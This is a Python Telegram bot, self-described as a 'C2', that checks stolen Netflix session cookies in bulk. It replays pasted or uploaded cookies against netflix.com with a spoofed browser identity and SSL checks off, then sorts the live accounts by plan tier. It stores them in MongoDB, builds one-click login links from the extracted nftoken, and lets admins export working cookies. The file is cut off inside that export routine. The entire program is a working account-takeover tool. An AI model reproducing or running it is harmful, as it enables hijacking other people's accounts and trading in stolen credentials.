#!/usr/bin/env python3
"""
NETFLIX COOKIES CHECKER BOT - TELEGRAM C2
Full-featured Netflix cookie validator with premium account detection.
Supports: Netscape format, Standard format, Base64 encoded format.
No proxy – direct connections.
Cookies stored in original multi-line Netscape format.
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import ssl
import uuid
import tempfile
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import urlparse, quote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

# API config
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "100"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "5"))
AUTO_DELETE_EXPIRED = os.getenv("AUTO_DELETE_EXPIRED", "True").lower() == "true"
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")

# ----------------------------- LOGGING ---------------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("netflix_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("netflix_bot")

# ----------------------------- UTILITY FUNCTIONS ------------------------
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def random_string(length: int = 16) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def parse_netscape_cookie(cookie_text: str) -> Dict[str, str]:
    cookie_dict = {}
    lines = cookie_text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookie_dict[name] = value
    return cookie_dict

def validate_cookie(cookie: str) -> bool:
    if not cookie:
        return False
    cookie = cookie.strip()
    # Check for typical Netflix patterns
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        return True
    if '=' in cookie and ';' in cookie:
        netflix_patterns = ['NetflixId', 'nfvdid', 'SecureNetflixId', 'netflix_session']
        cookie_lower = cookie.lower()
        for pattern in netflix_patterns:
            if pattern.lower() in cookie_lower:
                return True
    try:
        decoded = base64.b64decode(cookie, validate=True)
        if decoded:
            try:
                decoded_str = decoded.decode('utf-8')
                if '=' in decoded_str:
                    return True
            except:
                pass
    except:
        pass
    return False

def parse_cookie(cookie: str) -> Dict[str, str]:
    """Parse cookie string – handles Netscape multi-line, standard, base64."""
    cookie = cookie.strip()
    cookie_dict = {}
    # If it looks like Netscape (contains .netflix.com and TRUE)
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        try:
            cookie_dict = parse_netscape_cookie(cookie)
            if cookie_dict:
                return cookie_dict
        except Exception as e:
            logger.debug(f"Netscape parse failed: {e}")
    # Try base64 decode
    try:
        decoded = base64.b64decode(cookie, validate=True)
        try:
            cookie = decoded.decode('utf-8')
        except:
            pass
    except:
        pass
    # Standard format
    if ';' in cookie:
        parts = cookie.split(';')
    else:
        parts = cookie.split()
    for part in parts:
        part = part.strip()
        if '=' in part:
            key, value = part.split('=', 1)
            cookie_dict[key.strip()] = value.strip()
    return cookie_dict

def extract_nftoken(cookie_str: str) -> Optional[str]:
    """Extract ct parameter from NetflixId value for login link."""
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None
    params = {}
    for part in netflix_id.split('&'):
        if '=' in part:
            k, v = part.split('=', 1)
            params[k] = v
    return params.get('ct')

# ----------------------------- DATABASE --------------------------------
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        self._init_indexes()
        self._init_defaults()
    
    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.cookies.create_index([("expires_at", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
            self.checks.create_index([("user_id", ASCENDING)])
            logger.info("Database indexes initialized")
        except Exception as e:
            logger.error(f"Index initialization error: {e}")
    
    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {
                    "username": "admin",
                    "approved": True,
                    "is_admin": True,
                    "created_at": get_current_time()
                }},
                upsert=True
            )
        self.settings.update_one(
            {"_id": "global"},
            {"$setOnInsert": {
                "auto_delete_expired": AUTO_DELETE_EXPIRED,
                "max_bulk_check": MAX_BULK_CHECK,
                "concurrent_checks": CONCURRENT_CHECKS,
                "updated_at": get_current_time()
            }},
            upsert=True
        )
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "is_admin": user_id in ADMIN_IDS,
            "approved_at": None,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": get_current_time(),
            "last_active": get_current_time()
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time()}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None}}
        )
        return result.modified_count > 0
    
    def is_user_approved(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        return user.get("approved", False)
    
    def update_user_activity(self, user_id: int):
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"last_active": get_current_time()}}
        )
    
    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        self.users.update_one(
            {"user_id": user_id},
            {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}}
        )
    
    def add_cookie(self, cookie: str, user_id: int = None) -> str:
        """Store cookie as-is (multi-line Netscape allowed)."""
        cookie = cookie.strip()
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing.get("_id")
        cookie_data = {
            "_id": str(uuid.uuid4()),
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": get_current_time(),
            "views": 0
        }
        try:
            self.cookies.insert_one(cookie_data)
            logger.info(f"Added cookie: {cookie_hash[:8]}")
            return cookie_data["_id"]
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"cookie_hash": cookie_hash})["_id"]
    
    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and validate_cookie(cookie):
                try:
                    cookie_id = self.add_cookie(cookie, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "invalid_format"})
        return results
    
    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        return self.cookies.find_one({"_id": cookie_id})
    
    def get_cookie_by_hash(self, cookie_hash: str) -> Optional[Dict]:
        return self.cookies.find_one({"cookie_hash": cookie_hash})
    
    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        updates = {
            "status": status,
            "checked_at": get_current_time()
        }
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})
    
    def get_pending_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "pending"}).limit(limit))
    
    def get_valid_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))
    
    def get_cookie_stats(self) -> Dict:
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        tier_stats = {}
        for tier in ["Basic", "Standard", "Premium"]:
            tier_stats[tier] = self.cookies.count_documents({
                "status": "valid",
                "account_tier": tier
            })
        return {
            "total": total,
            "valid": valid,
            "invalid": invalid,
            "expired": expired,
            "pending": pending,
            "tiers": tier_stats
        }
    
    def delete_cookie(self, cookie_id: str) -> bool:
        result = self.cookies.delete_one({"_id": cookie_id})
        return result.deleted_count > 0
    
    def delete_invalid_cookies(self) -> int:
        result = self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}})
        return result.deleted_count
    
    def cleanup_expired(self) -> int:
        result = self.cookies.delete_many({"status": "expired"})
        return result.deleted_count
    
    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        check_data = {
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details,
            "timestamp": get_current_time()
        }
        self.checks.insert_one(check_data)
    
    def get_user_checks(self, user_id: int, limit: int = 20) -> List[Dict]:
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ----------------------------- NETFLIX CHECKER ENGINE -----------------
class NetflixChecker:
    @staticmethod
    async def check_single_cookie(cookie: str) -> Dict:
        result = {
            "valid": False,
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "error": None
        }
        
        # Parse from raw cookie string (may contain newlines)
        cookie_dict = parse_cookie(cookie)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": cookie_str,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "DNT": "1"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                url = "https://www.netflix.com/in/"
                
                async with session.get(
                    url,
                    headers=headers,
                    timeout=timeout,
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    final_lower = final_url.lower()
                    
                    # Strict validation
                    if "login" in final_lower or "signin" in final_lower:
                        result["error"] = "Redirected to login page"
                        return result
                    
                    if any(x in final_lower for x in ["browse", "profiles", "watch", "title"]):
                        logged_in = True
                    else:
                        if "logout" in html_lower:
                            logged_in = True
                        elif "profile" in html_lower and "sign out" in html_lower:
                            logged_in = True
                        else:
                            if 'netflix' in html_lower and 'sign in' not in html_lower:
                                if "whoops" in html_lower or "sorry" in html_lower:
                                    logged_in = False
                                else:
                                    logged_in = "profile" in html_lower or "avatar" in html_lower
                            else:
                                logged_in = False
                    
                    if not logged_in:
                        result["error"] = "Cookie invalid or expired"
                        return result
                    
                    result["valid"] = True
                    result["account_tier"] = NetflixChecker._extract_tier(html)
                    result["profile_name"] = NetflixChecker._extract_profile_name(html)
                    result["profile_language"] = "Unknown"
                    result["maturity_level"] = "Unknown"
                    
                    expire_match = re.search(r'"expires"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
                    if expire_match:
                        result["expires_at"] = expire_match.group(1)
                    
                    return result
                    
        except asyncio.TimeoutError:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def _extract_tier(html: str) -> str:
        match = re.search(r'planName["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if match:
            plan = match.group(1).lower()
            if "premium" in plan:
                return "Premium"
            elif "standard" in plan:
                return "Standard"
            elif "basic" in plan:
                return "Basic"
        match = re.search(r'plan[_-]?name["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if match:
            plan = match.group(1).lower()
            if "premium" in plan:
                return "Premium"
            elif "standard" in plan:
                return "Standard"
            elif "basic" in plan:
                return "Basic"
        levels = re.findall(r'maturityLevel["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if len(levels) >= 4:
            return "Premium"
        elif len(levels) >= 3:
            return "Standard"
        elif len(levels) >= 2:
            return "Basic"
        return "Unknown"
    
    @staticmethod
    def _extract_profile_name(html: str) -> str:
        match = re.search(r'profileName["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r'name["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if match and "profile" in match.group(1).lower():
            return match.group(1)
        return "Unknown"
    
    @staticmethod
    async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
        results = []
        semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
        
        async def check_one(cookie: str, index: int):
            async with semaphore:
                result = await NetflixChecker.check_single_cookie(cookie)
                result["cookie"] = cookie
                result["index"] = index
                if progress_callback:
                    await progress_callback(index, len(cookies))
                return result
        
        tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for result in results:
            if isinstance(result, Exception):
                processed.append({
                    "cookie": "",
                    "valid": False,
                    "error": str(result)
                })
            else:
                processed.append(result)
        return processed

# ----------------------------- INLINE KEYBOARD BUILDERS -----------------
def build_login_keyboard(cookie_id: str, nftoken: str) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🖥️ Login PC", url=f"https://netflix.com/login?nftoken={nftoken}"),
            InlineKeyboardButton("📺 Login TV", url=f"https://netflix.com/tv8?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📱 Login Android", url=f"https://netflix.com/android?nftoken={nftoken}"),
            InlineKeyboardButton("🍏 Login iPhone", url=f"https://netflix.com/iphone?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📤 Upload File", callback_data=f"upload_{cookie_id}"),
            InlineKeyboardButton("🔄 Restart", callback_data="restart"),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ----------------------------- TELEGRAM HANDLERS -----------------------
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.\nPlease contact admin for approval.")
        return
    await update.message.reply_text(
        "🎬 *Netflix Cookies Checker Bot*\n\n"
        "Commands:\n"
        "/check `<cookie>` - Check single cookie\n"
        "/bulk - Upload .txt file with cookies (one per line)\n"
        "/stats - Your checking statistics\n"
        "/valid - Get valid cookies\n"
        "/help - Show this message\n\n"
        "*Supported Formats:*\n"
        "• Standard: `name=value; name2=value2`\n"
        "• Netscape: `.netflix.com TRUE / ...`\n"
        "• Base64: `bmV0ZmxpeF9zZXNzaW9u...`\n\n"
        "Admin Commands:\n"
        "/approve <user_id> - Approve user\n"
        "/disapprove <user_id> - Disapprove user\n"
        "/users - List all users\n"
        "/cookies - Cookie statistics\n"
        "/export - Export valid cookies\n"
        "/cleanup - Delete invalid cookies",
        parse_mode="Markdown"
    )

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /check `<cookie>`\n\nYou can also send a cookie directly by pasting it in chat.")
        return
    cookie = " ".join(args)
    if not validate_cookie(cookie):
        await update.message.reply_text("❌ Invalid cookie format.\nSupported formats: Standard, Netscape, Base64.")
        return
    cookie_id = db.add_cookie(cookie, user_id)
    msg = await update.message.reply_text(f"🔄 *Checking cookie...*\nCookie ID: `{cookie_id[:8]}`\nPlease wait...", parse_mode="Markdown")
    result = await NetflixChecker.check_single_cookie(cookie)
    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {"error": result.get("error")})
        db.increment_user_stats(user_id, 1, 0)
    db.log_check(user_id, cookie_id, result.get("valid") and "valid" or "invalid", result)
    db.update_user_activity(user_id)
    
    if result.get("valid"):
        response = (
            "✅ *Account is Active*\n\n"
            f"📊 *Plan:* {result.get('account_tier', 'Unknown')}\n"
            f"👤 *Profile:* {result.get('profile_name', 'Unknown')}\n"
            f"🌍 *Language:* {result.get('profile_language', 'Unknown')}\n"
            f"🔞 *Maturity:* {result.get('maturity_level', 'Unknown')}\n"
        )
        if result.get('expires_at'):
            response += f"📅 *Expires:* {result.get('expires_at')}\n"
        response += f"🆔 `{cookie_id[:8]}`"
        
        # Extract nftoken
        cookie_doc = db.get_cookie(cookie_id)
        if cookie_doc:
            nftoken = extract_nftoken(cookie_doc.get("cookie", ""))
            if nftoken:
                keyboard = build_login_keyboard(cookie_id, nftoken)
                await msg.edit_text(response, parse_mode="Markdown", reply_markup=keyboard)
            else:
                await msg.edit_text(response + "\n\n⚠️ Could not extract nftoken for login.", parse_mode="Markdown")
        else:
            await msg.edit_text(response, parse_mode="Markdown")
    else:
        response = f"❌ *Invalid Cookie!*\n\nError: {result.get('error', 'Unknown error')}\n\n🆔 `{cookie_id[:8]}`"
        await msg.edit_text(response, parse_mode="Markdown")

async def handle_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    cookie = update.message.text.strip()
    if not validate_cookie(cookie):
        await update.message.reply_text("❌ Invalid cookie format.\nPlease use /check <cookie> or upload a .txt file with /bulk")
        return
    context.args = [cookie]
    await check_single(update, context)

# ----------------------------- CALLBACK HANDLERS ------------------------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "restart":
        await start(update, context)
        await query.edit_message_text("🔄 Restarted. Use /check to check a cookie.")
        return
    if data.startswith("upload_"):
        await query.edit_message_text("📤 Use /bulk to upload a file.")
        return

# ----------------------------- BULK CHECK -----------------------------
BULK_CHECK_STATE = 1

async def bulk_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return ConversationHandler.END
    await update.message.reply_text(
        "📁 *Bulk Cookie Check*\n\nPlease upload a `.txt` file with cookies (one per line).\n"
        f"Maximum: {MAX_BULK_CHECK} cookies per batch.\n"
        "Supported formats: Standard, Netscape, Base64.\n\nTo cancel, send /cancel."
    )
    return BULK_CHECK_STATE

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return ConversationHandler.END
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ No file uploaded.")
        return BULK_CHECK_STATE
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files are supported.")
        return BULK_CHECK_STATE
    msg = await update.message.reply_text("📥 Downloading file...")
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        cookies = file_content.decode('utf-8', errors='ignore').splitlines()
        cookies = [c.strip() for c in cookies if c.strip()]
        if not cookies:
            await msg.edit_text("❌ No cookies found in file.")
            return ConversationHandler.END
        if len(cookies) > MAX_BULK_CHECK:
            await msg.edit_text(f"❌ Too many cookies! Maximum {MAX_BULK_CHECK} per batch.\nFound: {len(cookies)}")
            return ConversationHandler.END
        
        # Add all cookies (including invalid formats will be marked)
        added = db.add_cookies_bulk(cookies, user_id)
        valid_added = [c for c in added if c.get("status") == "added"]
        if not valid_added:
            await msg.edit_text("❌ No valid cookies found in file. All skipped or invalid.")
            return ConversationHandler.END
        
        await msg.edit_text(f"✅ Added {len(valid_added)} cookies from file.\n❌ Invalid/skipped: {len(cookies) - len(valid_added)}\n\n🔄 Starting validation...")
        
        # Process bulk with progress
        total = len(valid_added)
        processed = 0
        valid_count = 0
        
        # We'll process in chunks to show progress
        chunk_size = 10
        for i in range(0, total, chunk_size):
            chunk = valid_added[i:i+chunk_size]
            cookies_to_check = [c["cookie"] for c in chunk]
            results = await NetflixChecker.check_bulk_cookies(cookies_to_check)
            for result in results:
                cookie = result.get("cookie", "")
                if not cookie:
                    continue
                cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
                cookie_doc = db.get_cookie_by_hash(cookie_hash)
                if cookie_doc:
                    if result.get("valid"):
                        db.update_cookie_status(cookie_doc["_id"], "valid", {
                            "account_tier": result.get("account_tier"),
                            "profile_name": result.get("profile_name"),
                            "profile_language": result.get("profile_language"),
                            "maturity_level": result.get("maturity_level"),
                            "expires_at": result.get("expires_at")
                        })
                        valid_count += 1
                    else:
                        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
                        db.update_cookie_status(cookie_doc["_id"], status, {"error": result.get("error")})
                    db.log_check(user_id, cookie_doc["_id"], result.get("valid") and "valid" or "invalid", result)
            processed += len(chunk)
            # Update progress every chunk
            try:
                await msg.edit_text(f"🔄 Processing... {processed}/{total} done.")
            except:
                pass  # Ignore edit errors
        
        db.increment_user_stats(user_id, total, valid_count)
        db.update_user_activity(user_id)
        response = f"📊 *Bulk Check Results*\n\nTotal processed: {total}\n✅ Valid: {valid_count}\n❌ Invalid/Expired: {total - valid_count}"
        await update.message.reply_text(response, parse_mode="Markdown")
        await msg.delete()  # Remove progress message
    except Exception as e:
        logger.error(f"Bulk check error: {e}")
        await msg.edit_text(f"❌ Error processing file: {str(e)}")
    return ConversationHandler.END

async def cancel_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Bulk operation cancelled.")
    return ConversationHandler.END

# ----------------------------- VALID COOKIES --------------------------
async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return
    cookies = db.get_valid_cookies(limit=20)
    if not cookies:
        await update.message.reply_text("📭 No valid cookies found.")
        return
    response = "✅ *Valid Cookies*\n\n"
    for i, cookie in enumerate(cookies[:10], 1):
        response += f"{i}. Tier: {cookie.get('account_tier', 'Unknown')}\n"
        response += f"   Profile: {cookie.get('profile_name', 'Unknown')}\n"
        response += f"   ID: `{cookie['_id'][:8]}`\n\n"
    if len(cookies) > 10:
        response += f"\n... and {len(cookies) - 10} more."
    await update.message.reply_text(response, parse_mode="Markdown")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    if not user:
        await update.message.reply_text("❌ User not found.")
        return
    stats_data = db.get_cookie_stats()
    user_checks = db.get_user_checks(user_id, limit=5)
    response = (
        f"📊 *Your Statistics*\n\n"
        f"Total Checks: {user.get('total_checks', 0)}\n"
        f"✅ Valid Cookies: {user.get('valid_cookies', 0)}\n"
        f"📅 Since: {user.get('created_at', get_current_time()).strftime('%Y-%m-%d')}\n\n"
        f"🌐 *Global Stats*\n"
        f"Total Cookies: {stats_data['total']}\n"
        f"✅ Valid: {stats_data['valid']}\n"
        f"❌ Invalid: {stats_data['invalid']}\n"
        f"⏰ Expired: {stats_data['expired']}\n"
        f"⏳ Pending: {stats_data['pending']}\n\n"
        f"*Tiers*\n"
        f"⭐ Premium: {stats_data['tiers']['Premium']}\n"
        f"📺 Standard: {stats_data['tiers']['Standard']}\n"
        f"📱 Basic: {stats_data['tiers']['Basic']}\n"
    )
    if user_checks:
        response += f"\n*Recent Checks*\n"
        for check in user_checks[:5]:
            status = "✅" if check.get("status") == "valid" else "❌"
            timestamp = check.get("timestamp", get_current_time()).strftime("%H:%M")
            response += f"{status} {timestamp} - {check.get('status')}\n"
    await update.message.reply_text(response, parse_mode="Markdown")

# ----------------------------- ADMIN COMMANDS ---------------------------
@admin_required
async def admin_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: /approve <user_id>")
            return
        user_id = int(context.args[0])
        db.create_user(user_id)
        if db.approve_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} approved.")
            try:
                await context.bot.send_message(user_id, "✅ Your account has been approved!\nYou can now use the Netflix cookie checker bot.")
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to approve user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def admin_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: /disapprove <user_id>")
            return
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} disapproved.")
        else:
            await update.message.reply_text("❌ Failed to disapprove user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = list(db.users.find({"user_id": {"$ne": None}}))
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    approved = sum(1 for u in users if u.get("approved", False))
    admins = sum(1 for u in users if u.get("is_admin", False))
    response = f"👥 *Users*\n\nTotal: {len(users)}\n✅ Approved: {approved}\n👑 Admins: {admins}\n\n"
    for user in users[:15]:
        status = "✅" if user.get("approved") else "❌"
        if user.get("is_admin"):
            status = "👑"
        response += f"{status} {user['user_id']} - Checks: {user.get('total_checks', 0)}\n"
    if len(users) > 15:
        response += f"\n... and {len(users) - 15} more."
    await update.message.reply_text(response, parse_mode="Markdown")

@admin_required
async def admin_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_cookie_stats()
    response = (
        f"🍪 *Cookie Statistics*\n\n"
        f"Total: {stats['total']}\n"
        f"✅ Valid: {stats['valid']}\n"
        f"❌ Invalid: {stats['invalid']}\n"
        f"⏰ Expired: {stats['expired']}\n"
        f"⏳ Pending: {stats['pending']}\n\n"
        f"*Tier Distribution*\n"
        f"⭐ Premium: {stats['tiers']['Premium']}\n"
        f"📺 Standard: {stats['tiers']['Standard']}\n"
        f"📱 Basic: {stats['tiers']['Basic']}\n"
    )
    await update.message.reply_text(response, parse_mode="Markdown")

@admin_required
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookies = db.get_valid_cookies()
    if not cookies:
        await update.message.reply_text("📭 No valid cookies to export.")
        return
    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    filepath = os.path.join(EXPORT_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("# Netflix Valid Cookies\n")
